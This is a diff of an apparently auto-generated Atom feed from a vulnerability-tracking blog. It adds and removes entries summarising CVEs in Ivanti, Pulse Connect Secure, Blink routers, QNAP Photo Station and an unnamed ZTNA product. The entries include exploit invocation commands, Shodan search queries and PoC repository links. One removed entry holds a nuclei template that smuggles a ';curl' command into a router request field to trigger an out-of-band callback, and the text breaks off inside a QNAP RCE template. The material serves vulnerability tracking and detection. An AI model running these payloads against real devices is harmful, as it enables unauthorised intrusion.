@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-15T09:45:18.569Z</updated>
+  <updated>2025-06-15T10:15:10.926Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,114 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2025-6083</title>
+    <link href="http://example.com/2025/06/15/github_3269379007/"/>
+    <id>http://example.com/2025/06/15/github_3269379007/</id>
+    <published>2025-06-15T10:15:10.929Z</published>
+    <updated>2025-06-15T10:15:10.926Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-6083</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-6083</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞描述：</strong> 该漏洞允许攻击者无需认证即可访问目标系统，或通过Bearer Token和手动cookie进行认证后访问。</p><p><strong>来源：</strong> <a href="https://github.com/Yuri08loveElaina/CVE_2025_6083">https://github.com/Yuri08loveElaina/CVE_2025_6083</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>Exploit.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><ul><li>Nếu không cần xác thực<br>python3 exploit6083.py –url <a href="https://ztna.target.com/">https://ztna.target.com</a> –search admin</li><li>Dùng Bearer Token<br>  python3 exploit6083.py –url <a href="https://ztna.target.com/">https://ztna.target.com</a> –search admin –auth-token abcdef123456  </li><li>Dùng cookie thủ công<br>python3 exploit6083.py –url <a href="https://ztna.target.com/">https://ztna.target.com</a> –search admin –cookie “PHPSESSID&#x3D;xyz; user&#x3D;admin”</li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-6083&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows SMB高危漏洞分析：Kerberos缺陷导致攻击者可获取SYSTEM权限</title>
+    <link href="http://example.com/2025/06/15/weixin_788953779/"/>
+    <id>http://example.com/2025/06/15/weixin_788953779/</id>
+    <published>2025-06-15T10:15:02.501Z</published>
+    <updated>2025-06-15T10:15:02.498Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/dY34JvrZb4dctCYH05lXWQ">https://mp.weixin.qq.com/s/dY34JvrZb4dctCYH05lXWQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/dY34JvrZb4dctCYH05lXWQ&quot;&gt;https://mp.weixin.q</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>一周网安优质PDF资源推荐  FreeBuf知识大陆</title>
+    <link href="http://example.com/2025/06/15/weixin_2711518352/"/>
+    <id>http://example.com/2025/06/15/weixin_2711518352/</id>
+    <published>2025-06-15T10:15:01.728Z</published>
+    <updated>2025-06-15T10:15:01.726Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/w4-l2QVwnJDfIU25r715Xw">https://mp.weixin.qq.com/s/w4-l2QVwnJDfIU25r715Xw</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/w4-l2QVwnJDfIU25r715Xw&quot;&gt;https://mp.weixin.q</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>生成式AI面临的的主要安全风险以及解决策略</title>
+    <link href="http://example.com/2025/06/15/weixin_586096377/"/>
+    <id>http://example.com/2025/06/15/weixin_586096377/</id>
+    <published>2025-06-15T10:15:00.557Z</published>
+    <updated>2025-06-15T10:15:00.554Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/fBsUcFY8KWFeaKpvZfHeIg">https://mp.weixin.qq.com/s/fBsUcFY8KWFeaKpvZfHeIg</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/fBsUcFY8KWFeaKpvZfHeIg&quot;&gt;https://mp.weixin.q</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
+    
+  </entry>
   
   <entry>
     <title>Jan 任意文件上传漏洞</title>
@@ -441,112 +549,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="目录遍历" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ivanti Buffer Overflow Vulnerability</title>
-    <link href="http://example.com/2025/06/14/github_2121782117/"/>
-    <id>http://example.com/2025/06/14/github_2121782117/</id>
-    <published>2025-06-14T19:15:45.755Z</published>
-    <updated>2025-06-14T19:15:45.752Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Ivanti Buffer Overflow Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-0282</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Ivanti Connect Secure &lt; 22.7R2.5, Ivanti Policy Secure &lt; 22.7R1.2, 以及 Ivanti Neurons for ZTA gateways &lt; 22.7R2.3 存在一个由于不当输入处理导致的栈基缓冲区溢出漏洞，允许远程未认证攻击者通过发送特制请求执行任意代码。</p><p><strong>产品厂商：</strong> Ivanti</p><p><strong>产品名称：</strong> Ivanti Connect Secure, Ivanti Policy Secure, Ivanti Neurons for ZTA gateways</p><p><strong>影响版本：</strong> Ivanti Connect Secure &lt; 22.7R2.5, Ivanti Policy Secure &lt; 22.7R1.2, Ivanti Neurons for ZTA gateways &lt; 22.7R2.3</p><p><strong>搜索语法：</strong> http.title:”ivanti connect secure”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12130">https://github.com/projectdiscovery/nuclei-templates/issues/12130</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Ivanti Connect Secure &lt; 22.7R2.5, Ivanti Policy Secure &lt; 22.7R1.2, and Ivanti Neurons for ZTA gateways &lt; 22.7R2.3 contain a stack-based buffer overflow caused by improper input handling, letting remote unauthenticated attackers execute arbitrary code, exploit requires sending crafted requests.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day">https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day</a></li><li><a href="https://github.com/sfewer-r7/CVE-2025-0282">https://github.com/sfewer-r7/CVE-2025-0282</a></li><li><a href="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/">https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/</a></li><li><a href="https://github.com/punitdarji/Ivanti-CVE-2025-0282">https://github.com/punitdarji/Ivanti-CVE-2025-0282</a></li><li><a href="https://vulncheck.com/xdb/043030d6caa4">https://vulncheck.com/xdb/043030d6caa4</a></li><li><a href="https://github.com/44xo/CVE-2025-0282">https://github.com/44xo/CVE-2025-0282</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:44xo&#x2F;CVE-2025-0282.git</li><li><a href="https://github.com/AdaniKamal/CVE-2025-0282">https://github.com/AdaniKamal/CVE-2025-0282</a></li><li><a href="https://vulncheck.com/xdb/858b463ecabe">https://vulncheck.com/xdb/858b463ecabe</a></li><li><a href="https://github.com/almanatra/CVE-2025-0282">https://github.com/almanatra/CVE-2025-0282</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:almanatra&#x2F;CVE-2025-0282.git</li><li><a href="https://github.com/Hexastrike/Ivanti-Connect-Secure-Logs-Parser">https://github.com/Hexastrike/Ivanti-Connect-Secure-Logs-Parser</a></li><li><a href="https://vulncheck.com/xdb/d343e6784986">https://vulncheck.com/xdb/d343e6784986</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:sfewer-r7&#x2F;CVE-2025-0282.git</li><li><a href="https://github.com/watchtowrlabs/CVE-2025-0282">https://github.com/watchtowrlabs/CVE-2025-0282</a></li><li><a href="https://github.com/rxwx/pulse-meter">https://github.com/rxwx/pulse-meter</a></li><li><a href="https://github.com/AnonStorks/CVE-2025-0282-Full-version">https://github.com/AnonStorks/CVE-2025-0282-Full-version</a></li><li><a href="https://github.com/absholi7ly/CVE-2025-0282-Ivanti-exploit">https://github.com/absholi7ly/CVE-2025-0282-Ivanti-exploit</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-ivanti-connect-secure"><a href="#Shodan-Query-http-title-ivanti-connect-secure" class="headerlink" title="Shodan Query: http.title:&quot;ivanti connect secure&quot;"></a>Shodan Query: <code>http.title:&quot;ivanti connect secure&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Ivanti Buffer Overflow Vulnerability&lt;/p</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pulse Connect Secure 认证绕过漏洞</title>
-    <link href="http://example.com/2025/06/14/github_495590215/"/>
-    <id>http://example.com/2025/06/14/github_495590215/</id>
-    <published>2025-06-14T18:30:26.012Z</published>
-    <updated>2025-06-14T18:30:26.017Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Pulse Connect Secure 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-22893</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Pulse Connect Secure 9.0R3&#x2F;9.1R1及更高版本中的Windows文件共享浏览器和Pulse Secure协作功能存在认证绕过漏洞，允许未认证的攻击者执行远程任意代码，利用此漏洞需要访问易受攻击的功能。</p><p><strong>产品厂商：</strong> Pulse Secure</p><p><strong>产品名称：</strong> Pulse Connect Secure</p><p><strong>影响版本：</strong> 9.0R3&#x2F;9.1R1 and higher</p><p><strong>搜索语法：</strong> http.title:”ivanti connect secure”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12129">https://github.com/projectdiscovery/nuclei-templates/issues/12129</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Pulse Connect Secure 9.0R3&#x2F;9.1R1 and higher contains an authentication bypass caused by vulnerabilities in Windows File Share Browser and Pulse Secure Collaboration features, letting unauthenticated attackers perform remote arbitrary code execution, exploit requires access to vulnerable features.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://github.com/orangmuda/CVE-2021-22893">https://github.com/orangmuda/CVE-2021-22893</a></li><li><a href="https://github.com/MRLEE123456/CVE-2021-22893">https://github.com/MRLEE123456/CVE-2021-22893</a></li><li><a href="https://github.com/ZephrFish/CVE-2021-22893_HoneyPoC2">https://github.com/ZephrFish/CVE-2021-22893_HoneyPoC2</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-ivanti-connect-secure"><a href="#Shodan-Query-http-title-ivanti-connect-secure" class="headerlink" title="Shodan Query: http.title:&quot;ivanti connect secure&quot;"></a>Shodan Query: <code>http.title:&quot;ivanti connect secure&quot;</code></h4>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Pulse Connect Secure 认证绕过漏洞&lt;/p&gt;
-&lt;p&gt;&lt;str</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Blink Routers Command Injection via bs_SetSSIDHide</title>
-    <link href="http://example.com/2025/06/14/github_1636604559/"/>
-    <id>http://example.com/2025/06/14/github_1636604559/</id>
-    <published>2025-06-14T17:45:37.875Z</published>
-    <updated>2025-06-14T17:45:37.875Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Blink Routers Command Injection via bs_SetSSIDHide</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-45985</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 该模板检查Blink路由器中的命令注入漏洞，通过利用<code>bs_SetSSIDHide</code>功能在<code>/goform/set_hidessid_cfg</code>端点进行攻击。</p><p><strong>产品厂商：</strong> Blink</p><p><strong>产品名称：</strong> Blink Routers</p><p><strong>搜索语法：</strong> title:”B-LINK” product:”GoAhead Embedded Web Server”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12345">https://github.com/projectdiscovery/nuclei-templates/issues/12345</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Is-there-an-existing-template-for-this"><a href="#Is-there-an-existing-template-for-this" class="headerlink" title="Is there an existing template for this?"></a>Is there an existing template for this?</h4><ul><li><input checked="" disabled="" type="checkbox"> I have searched the existing templates.</li></ul><h4 id="Nuclei-Template"><a href="#Nuclei-Template" class="headerlink" title="Nuclei Template"></a>Nuclei Template</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">cve-2025-45985</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Blink</span> <span class="hljs-string">Routers</span> <span class="hljs-string">Command</span> <span class="hljs-string">Injection</span> <span class="hljs-string">via</span> <span class="hljs-string">bs_SetSSIDHide</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">darses</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    This template checks for a command injection vulnerability in the `/goform/set_hidessid_cfg` endpoint of Blink routers by exploiting the `bs_SetSSIDHide` function.</span><br><span class="hljs-string"></span>  <span class="hljs-attr">tags:</span> <span class="hljs-string">oast</span><br>  <span class="hljs-attr">metadata:</span><br>    <span class="hljs-attr">shodan-query:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">title:&quot;B-LINK&quot;</span> <span class="hljs-string">product:&quot;GoAhead</span> <span class="hljs-string">Embedded</span> <span class="hljs-string">Web</span> <span class="hljs-string">Server&quot;</span><br>  <span class="hljs-attr">reference:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-45985</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/glkfc/IoT-Vulnerability/blob/main/LB-LINK/LB-LINK_enable%20Unauthorized%20command%20injection/LB-LINK_enable%20command%20injection.md</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">method:</span> <span class="hljs-string">POST</span><br>    <span class="hljs-attr">path:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/goform/set_hidessid_cfg&quot;</span><br><br>    <span class="hljs-attr">body:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      type=sethide2&amp;enable=&quot;;curl &#123;&#123;interactsh-url&#125;&#125;;&quot;</span><br><span class="hljs-string"></span><br>    <span class="hljs-attr">matchers-condition:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">status</span><br>        <span class="hljs-attr">status:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;&#123;&quot;type&quot;:&quot;sethide2&quot;,&quot;result&quot;:0&#125;&#x27;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">dsl</span><br>        <span class="hljs-attr">dsl:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;contains(interactsh_protocol, &quot;dns&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="Relevant-dumped-responses"><a href="#Relevant-dumped-responses" class="headerlink" title="Relevant dumped responses"></a>Relevant dumped responses</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br></code></pre></td></tr></table></figure><h4 id="Anything-else"><a href="#Anything-else" class="headerlink" title="Anything else?"></a>Anything else?</h4><p>I did not validate the template as I do not have a D-Link Router. The check is based on the publicly available research, and modified to add an OAST check.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Blink Routers Command Injection via bs_</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>QNAP Photo Station 未授权远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/14/github_1882250685/"/>
-    <id>http://example.com/2025/06/14/github_1882250685/</id>
-    <published>2025-06-14T17:45:19.799Z</published>
-    <updated>2025-06-14T17:45:19.799Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> QNAP Photo Station 未授权远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-7194</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> QNAP Photo Station 6.0.3之前的版本存在多个漏洞，当这些漏洞被串联利用时，可实现未经认证的远程代码执行（RCE）。这包括一个涉及文件名或路径外部控制的缺陷，允许攻击者访问或修改敏感系统文件。为了减轻这些风险，QNAP强烈建议将Photo Station更新到最新可用版本。</p><p><strong>产品厂商：</strong> QNAP</p><p><strong>产品名称：</strong> QNAP Photo Station</p><p><strong>影响版本：</strong> &lt; 6.0.3</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/e55eed563ed52676a776d6a38b63eba9c5d08285/http%2Fcves%2F2019%2FCVE-2019-7194.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/e55eed563ed52676a776d6a38b63eba9c5d08285/http%2Fcves%2F2019%2FCVE-2019-7194.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> qnap-photostation-CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">719</span>4-preauth-rce<br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> QNAP Photo Station <span class="hljs-operator">&lt;</span> <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> pre-auth RCE<br>  <span class="hljs-params">author:</span> x-stp<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    QNAP Photo Station versions prior to <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> contain multiple vulnerabilities that, when chained together, enable unauthenticated remote code execution (RCE).<br>    This includes a flaw involving external control of file names <span class="hljs-keyword">or</span> paths, allowing attackers to access <span class="hljs-keyword">or</span> modify sensitive system files.<br>    To mitigate these risks, QNAP strongly recommends updating Photo Station to the latest available versions.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span 